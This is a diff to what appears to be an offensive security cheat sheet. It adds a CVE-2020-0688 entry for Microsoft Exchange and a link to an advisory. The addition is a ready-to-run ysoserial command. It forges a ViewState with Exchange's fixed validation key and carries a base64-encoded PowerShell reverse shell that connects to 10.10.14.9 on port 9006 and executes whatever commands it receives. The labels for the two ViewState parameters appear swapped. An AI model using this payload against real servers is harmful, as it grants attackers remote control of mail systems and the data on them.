@@ -919,6 +919,15 @@ curl -k --ntlm -u '$domain\$user:$password' https://$domain/OAB/$OABUrl/$OABId-d
 
 ### CVE-2020-0688
 
+this CVE allow RCE on EWS through fixed cryptographic keys
+
+*ViewStateUserKey* : `document.getElementById("_VIEWSTATEGENERATOR").value`
+*ViewStateGenerator* : `ASP.NET_SessionId`
+```powershell
+ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -exec bypass -enc JHNtPShOZXctT2JqZWN0IE5ldC5Tb2NrZXRzLlRDUENsaWVudCgiMTAuMTAuMTQuOSIsOTAwNikpLkdldFN0cmVhbSgpO1tieXRlW11dJGJ0PTAuLjY1NTM1fCV7MH07d2hpbGUoKCRpPSRzbS5SZWFkKCRidCwwLCRidC5MZW5ndGgpKSAtbmUgMCl7OyRkPShOZXctT2JqZWN0IFRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5nKCRidCwwLCRpKTskc3Q9KFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKChpZXggJGQgMj4mMSkpOyRzbS5Xcml0ZSgkc3QsMCwkc3QuTGVuZ3RoKX0=" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="B97B4E27" --viewstateuserkey="05ae4b41-51e1-4c3a-9241-6b87b169d663" --isdebug –islegacy
+```
+
+
 
 ## MSSQL Server 
 
@@ -1212,3 +1221,4 @@ https://www.thehacker.recipes/ad/movement/kerberos/asreproast
 https://www.hackingarticles.in/credential-dumping-ntds-dit/
 https://blog.alsid.eu/dcshadow-explained-4510f52fc19d
 https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
+https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys
